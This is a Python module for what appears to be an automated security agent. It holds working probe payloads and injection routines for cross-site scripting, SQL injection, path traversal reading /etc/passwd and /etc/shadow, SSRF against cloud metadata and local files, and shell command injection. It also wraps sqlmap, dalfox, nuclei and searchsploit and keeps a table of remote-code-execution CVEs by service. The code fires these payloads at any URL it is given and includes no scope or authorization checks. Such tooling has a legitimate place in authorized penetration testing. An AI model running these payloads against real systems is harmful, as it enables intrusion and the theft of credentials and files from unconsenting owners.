"""Vulnerability probe strategies: xss, sqli, lfi, ssrf, cmd-injection, cve search."""
from __future__ import annotations

import re
import shlex
import time
import urllib.parse
from typing import Any, Dict, List, Tuple

from security_agent.tools.fallback import FallbackRunner
from security_agent.tools.arsenal_http import format_url, http_get, http_post, http_request

XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "\"><svg/onload=alert(1)>",
    "'-alert(1)-'",
    "<svg/onload=alert(document.domain)>",
    "javascript:alert(1)",
]
SQLI_PAYLOADS = [
    "' OR '1'='1",
    "' OR 1=1--",
    "' OR 1=1#",
    "1' OR '1'='1'--",
    "' UNION SELECT NULL--",
    "1 AND 1=1",
    "1 AND 1=2",
    "' AND SLEEP(3)--",
    "1' AND SLEEP(3)--",
    "'; WAITFOR DELAY '0:0:3'--",
]
LFI_PAYLOADS = [
    # Traversal-depth sweep first (3-9 levels) so deep webroots still resolve.
    *[("/" .join([".."] * depth)) + "/etc/passwd" for depth in range(3, 10)],
    "/etc/passwd",                         # absolute path: join() discards the base dir
    "/etc/shadow",
    "....//....//....//etc/passwd",        # literal-dot WAF bypass (server-dependent)
    "..%2f..%2f..%2fetc%2fpasswd",         # encoded slashes (single decode)
    "..%252f..%252f..%252fetc%252fpasswd", # double-encoded slashes
    "....//....//....//etc/shadow",
    *[("/" .join([".."] * depth)) + "/etc/shadow" for depth in range(3, 6)],
]
CMDI_PAYLOADS = [
    "; sleep 3",
    "| sleep 3",
    "`sleep 3`",
    "$(sleep 3)",
    "& sleep 3",
    "; id",
    "| id",
    "$(id)",
    "`id`",
    "&& whoami",
]
SSRF_TARGETS = [
    "http://127.0.0.1/",
    "http://localhost/",
    "http://169.254.169.254/latest/meta-data/",
    "http://127.0.0.1:8080/",
    "file:///etc/passwd",
]


def _inject(url: str, param: str, payload: str, method: str = "GET",
            data: str = "", timeout: float = 8.0) -> Dict[str, Any]:
    if method.upper() == "POST":
        body = data or f"{param}={urllib.parse.quote(payload, safe="%")}"
        if data and param not in data:
            body = data.replace(param, param)  # keep as-is; caller controls
        return http_post(url, body, timeout=timeout)
    quoted = urllib.parse.quote(payload, safe="%")
    # If the param already appears in the URL query, replace its value so the
    # payload is actually injected (first occurrence wins in most frameworks).
    if re.search(rf"[?&]{re.escape(param)}=", url):
        url = re.sub(rf"([?&]){re.escape(param)}=[^&]*", rf"\1{param}={quoted}", url)
        return http_get(url, timeout=timeout)
    sep = "&" if "?" in url else "?"
    return http_get(f"{url}{sep}{param}={quoted}", timeout=timeout)


def _xss_dalfox(runner: FallbackRunner, kw: Dict[str, Any]) -> Tuple[bool, str, str]:
    if not runner.tool_available("dalfox"):
        return False, "dalfox not installed", ""
    url = kw.get("url", "")
    res = runner.run_cmd(f"dalfox url {shlex.quote(url)} --silence 2>&1 | tail -40", timeout=200)
    out = res.get("stdout", "")
    if "[POC]" in out or "VULNERABLE" in out.upper():
        return True, "XSS confirmed", out
    return False, "dalfox found no XSS", out[-1500:]


def _xss_py(runner: FallbackRunner, kw: Dict[str, Any]) -> Tuple[bool, str, str]:
    url = format_url(kw.get("url", ""))
    param = kw.get("param", "q")
    if not url:
        return False, "no url", ""
    marker = "ARSENALXSSMARKER"
    found = []
    for payload in XSS_PAYLOADS:
        r = _inject(url, param, payload, kw.get("method", "GET"), kw.get("data", ""))
        if r["status"] == 0:
            continue
        if payload in r["body"]:
            found.append((payload, r["status"], "reflected"))
        elif marker in r["body"]:
            found.append((payload, r["status"], "reflected(marker)"))
    if found:
        lines = [f"  {p} -> {s} ({kind})" for p, s, kind in found[:15]]
        return True, f"{len(found)} reflected payloads", "Reflected XSS candidates:\n" + "\n".join(lines)
    return False, "no reflection detected", f"Tested {len(XSS_PAYLOADS)} payloads on param '{param}'"


def _sqli_sqlmap(runner: FallbackRunner, kw: Dict[str, Any]) -> Tuple[bool, str, str]:
    if not runner.tool_available("sqlmap"):
        return False, "sqlmap not installed", ""
    url = kw.get("url", "")
    data = kw.get("data", "")
    method = str(kw.get("method", "GET")).upper()
    param = kw.get("param", "")
    level = kw.get("level", "1")
    flag = kw.get("flag", "")
    # If the caller specified a POST form/body param but no raw data string,
    # derive the body so sqlmap actually tests the right injection point.
    if method == "POST" and not data and param:
        data = f"{param}=1"
    cmd = f"sqlmap -u {shlex.quote(url)} --batch --level {shlex.quote(str(level))} --risk 1 --threads 2 --timeout 15 --retries 1 --smart"
    if method == "POST":
        cmd += " --method POST"
    if data:
        cmd += f" --data {shlex.quote(data)}"
    if flag:
        cmd += f" {flag}"
    res = runner.run_cmd(cmd + " 2>&1 | tail -60", timeout=300)
    out = res.get("stdout", "")
    if "is vulnerable" in out or "injectable" in out.lower():
        return True, "SQL injection confirmed", out[-4000:]
    return False, "sqlmap found no injection", out[-2000:]


def _sqli_py(runner: FallbackRunner, kw: Dict[str, Any]) -> Tuple[bool, str, str]:
    url = format_url(kw.get("url", ""))
    param = kw.get("param", "q")
    if not url:
        return False, "no url", ""
    method = kw.get("method", "GET")
    data = kw.get("data", "")
    base = _inject(url, param, "1", method, data)
    if base["status"] == 0:
        return False, "target unreachable", base["error"]
    base_len = len(base["body"])
    findings = []
    # boolean-based
    r_true = _inject(url, param, "1' OR '1'='1", method, data)
    r_false = _inject(url, param, "1' OR '1'='2", method, data)
    if r_true["status"] and r_false["status"]:
        if abs(len(r_true["body"]) - len(r_false["body"])) > 50:
            findings.append("boolean-based (OR 1=1 vs OR 1=2 differ)")
    # time-based
    t0 = time.time()
    _inject(url, param, "' AND SLEEP(3)--", method, data, timeout=10)
    dt = time.time() - t0
    if dt >= 2.5:
        findings.append(f"time-based (SLEEP(3) took {dt:.1f}s)")
    if findings:
        return True, "SQLi indicators", f"Param '{param}':\n" + "\n".join(f"  - {f}" for f in findings)
    return False, "no SQLi indicators", f"Param '{param}': boolean and time-based checks negative"


def _lfi_py(runner: FallbackRunner, kw: Dict[str, Any]) -> Tuple[bool, str, str]:
    url = format_url(kw.get("url", ""))
    param = kw.get("param", "file")
    if not url:
        return False, "no url", ""
    found = []
    for payload in LFI_PAYLOADS:
        r = _inject(url, param, payload, kw.get("method", "GET"), kw.get("data", ""))
        if r["status"] == 0:
            continue
        body = r["body"]
        if "root:x:0:0" in body:
            found.append((payload, "etc/passwd leaked"))
        elif "root:" in body and "bin/bash" in body:
            found.append((payload, "passwd-like content"))
        elif "daemon:" in body:
            found.append((payload, "passwd-like content"))
    if found:
        lines = [f"  {p} -> {k}" for p, k in found[:15]]
        return True, f"{len(found)} LFI indicators", "LFI candidates:\n" + "\n".join(lines)
    return False, "no LFI indicators", f"Tested {len(LFI_PAYLOADS)} traversal payloads on param '{param}'"


def _ssrf_py(runner: FallbackRunner, kw: Dict[str, Any]) -> Tuple[bool, str, str]:
    url = format_url(kw.get("url", ""))
    param = kw.get("param", "url")
    if not url:
        return False, "no url", ""
    found = []
    for target in SSRF_TARGETS:
        r = _inject(url, param, target, kw.get("method", "GET"), kw.get("data", ""))
        if r["status"] == 0:
            continue
        body = r["body"]
        if "root:x:0:0" in body:
            found.append((target, "file:// read /etc/passwd"))
        elif "aws" in body.lower() and "instance" in body.lower():
            found.append((target, "cloud metadata leaked"))
        elif "corplab" in body.lower() or "portal" in body.lower():
            found.append((target, "internal page fetched"))
        elif r["status"] in (200, 301, 302) and len(body) > 0:
            found.append((target, f"status {r['status']} len {len(body)}"))
    if found:
        lines = [f"  {t} -> {k}" for t, k in found[:15]]
        return True, f"{len(found)} SSRF indicators", "SSRF candidates:\n" + "\n".join(lines)
    return False, "no SSRF indicators", f"Tested {len(SSRF_TARGETS)} targets on param '{param}'"


def _cmdi_py(runner: FallbackRunner, kw: Dict[str, Any]) -> Tuple[bool, str, str]:
    url = format_url(kw.get("url", ""))
    param = kw.get("param", "host")
    if not url:
        return False, "no url", ""
    method = kw.get("method", "GET")
    data = kw.get("data", "")
    findings = []
    # timing-based
    for payload in ("; sleep 3", "| sleep 3", "`sleep 3`", "$(sleep 3)", "& sleep 3"):
        t0 = time.time()
        _inject(url, param, payload, method, data, timeout=10)
        dt = time.time() - t0
        if dt >= 2.5:
            findings.append(f"time-based ({payload} -> {dt:.1f}s)")
            break
    # output-based
    for payload in ("; id", "| id", "$(id)", "`id`", "&& whoami"):
        r = _inject(url, param, payload, method, data)
        if r["status"] and ("uid=" in r["body"] or "root" in r["body"].lower() and "bin" in r["body"].lower()):
            findings.append(f"output-based ({payload})")
            break
    if findings:
        return True, "command injection indicators", f"Param '{param}':\n" + "\n".join(f"  - {f}" for f in findings)
    return False, "no command injection indicators", f"Param '{param}': timing and output checks negative"


from security_agent.tools.fallback import FallbackRunner, is_failed_result


def _cve_nuclei(runner: FallbackRunner, kw: Dict[str, Any]) -> Tuple[bool, str, str]:
    if not runner.tool_available("nuclei"):
        return False, "nuclei not installed", ""
    url = format_url(kw.get("url", ""))
    tag = kw.get("template", "cves")
    probe = runner.run_cmd("nuclei -tl 2>&1 | head -5", timeout=20)
    if is_failed_result(probe):
        return False, "nuclei not available", ""
    pout = (probe.get("stdout") or "") + " " + (probe.get("stderr") or "")
    plow = pout.lower()
    if not pout.strip() or "no templates" in plow or "failed" in plow or "not found" in plow:
        return False, "nuclei templates not installed (skip)", ""
    cmd = f"nuclei -u {shlex.quote(url)} -tags {shlex.quote(tag)} -silent -timeout 8 -retries 1 2>&1 | tail -50"
    res = runner.run_cmd(cmd, timeout=300)
    if is_failed_result(res):
        return False, "nuclei scan failed", res.get("stderr") or res.get("stdout")
    out = res.get("stdout", "")
    if out.strip():
        return True, "nuclei findings", out
    return True, "nuclei clean", "Nuclei completed with 0 findings."


def _cve_searchsploit(runner: FallbackRunner, kw: Dict[str, Any]) -> Tuple[bool, str, str]:
    if not runner.tool_available("searchsploit"):
        return False, "searchsploit not installed", ""
    query = kw.get("query") or kw.get("url") or ""
    if not query:
        return False, "no query", ""
    res = runner.run_cmd(f"searchsploit {shlex.quote(query)} 2>&1 | tail -40", timeout=60)
    if is_failed_result(res):
        return False, "searchsploit failed", res.get("stderr") or res.get("stdout")
    out = res.get("stdout", "")
    if "Exploit Title" in out or "----" in out:
        return True, "exploitdb matches", out
    return True, "searchsploit complete (0 matches)", "ExploitDB search completed with 0 matches."


def _cve_py(runner: FallbackRunner, kw: Dict[str, Any]) -> Tuple[bool, str, str]:
    """Offline known-CVE lookup for common services (no network dependency)."""
    query = (kw.get("query") or kw.get("url") or "").lower()
    if not query:
        return False, "no query", ""
    known = {
        "apache": ["CVE-2021-41773 (path traversal/RCE, 2.4.49)", "CVE-2021-42013 (RCE, 2.4.49/2.4.50)",
                   "CVE-2017-15715 (filename bypass)", "CVE-2021-44228 (log4shell if log4j used)"],
        "nginx": ["CVE-2021-23017 (DNS resolver)", "CVE-2017-7529 (integer overflow)", "CVE-2013-4547 (URI bypass)"],
        "openssh": ["CVE-2024-6387 (regreSSHion RCE, <9.8p1)", "CVE-2023-38408 (ssh-agent RCE)",
                    "CVE-2016-6210 (user enumeration)"],
        "php": ["CVE-2024-4577 (Windows CGI RCE)", "CVE-2019-11043 (FPM RCE)", "CVE-2012-1823 (CGI RCE)"],
        "wordpress": ["CVE-2023-3460 (Ultimate Member priv-esc)", "CVE-2022-21661 (SQLi)",
                      "CVE-2019-8942 (RCE via image upload)"],
        "tomcat": ["CVE-2020-1938 (Ghostcat AJP RCE)", "CVE-2017-12615 (PUT RCE)", "CVE-2017-12617 (PUT RCE)"],
        "jenkins": ["CVE-2024-23897 (arbitrary file read)", "CVE-2018-1000861 (RCE)"],
        "gitlab": ["CVE-2021-22205 (RCE via ExifTool)", "CVE-2023-7028 (account takeover)"],
        "grafana": ["CVE-2021-43798 (path traversal)", "CVE-2023-3128 (auth bypass)"],
        "redis": ["CVE-2022-0543 (Lua sandbox RCE)", "CVE-2015-4335 (unauth config)"],
        "mysql": ["CVE-2012-2122 (auth bypass)", "CVE-2016-6662 (RCE)"],
        "postgresql": ["CVE-2018-1058 (search_path RCE)", "CVE-2013-1899 (RCE)"],
        "samba": ["CVE-2017-7494 (EternalRed RCE)", "CVE-2021-44142 (RCE)"],
        "vsftpd": ["CVE-2011-2523 (backdoor)"],
        "proftpd": ["CVE-2015-3306 (mod_copy RCE)"],
        "drupal": ["CVE-2018-7600 (Drupalgeddon2 RCE)", "CVE-2019-6340 (RCE)"],
        "joomla": ["CVE-2015-8562 (RCE)"],
        "struts": ["CVE-2017-5638 (RCE)", "CVE-2018-11776 (RCE)"],
        "log4j": ["CVE-2021-44228 (Log4Shell RCE)"],
        "spring": ["CVE-2022-22965 (Spring4Shell RCE)"],
        "weblogic": ["CVE-2020-14882 (RCE)", "CVE-2019-2725 (RCE)"],
        "phpmyadmin": ["CVE-2018-12613 (LFI/RCE)", "CVE-2016-5734 (RCE)"],
        "docker": ["CVE-2019-5736 (runc RCE)", "CVE-2024-21626 (runc escape)"],
        "kubernetes": ["CVE-2018-1002105 (privilege escalation)"],
    }
    hits = []
    for key, cves in known.items():
        if key in query:
            hits.extend(cves)
    if hits:
        return True, f"{len(hits)} known CVEs", "Known CVEs for '" + query + "':\n  - " + "\n  - ".join(hits)
    return True, "cve scan complete (0 offline signatures)", f"No known CVE signatures matched query '{query}'."


def xss_scan_chain() -> List[Tuple[str, Any]]:
    return [("dalfox", _xss_dalfox), ("python-reflected", _xss_py)]


def sqli_scan_chain() -> List[Tuple[str, Any]]:
    return [("sqlmap", _sqli_sqlmap), ("python-boolean-time", _sqli_py)]


def lfi_scan_chain() -> List[Tuple[str, Any]]:
    return [("python-traversal", _lfi_py)]


def ssrf_scan_chain() -> List[Tuple[str, Any]]:
    return [("python-ssrf", _ssrf_py)]


def cmdi_scan_chain() -> List[Tuple[str, Any]]:
    return [("python-cmdi", _cmdi_py)]


def cve_scan_chain() -> List[Tuple[str, Any]]:
    return [("nuclei-cves", _cve_nuclei), ("searchsploit", _cve_searchsploit), ("python-knowncve", _cve_py)]
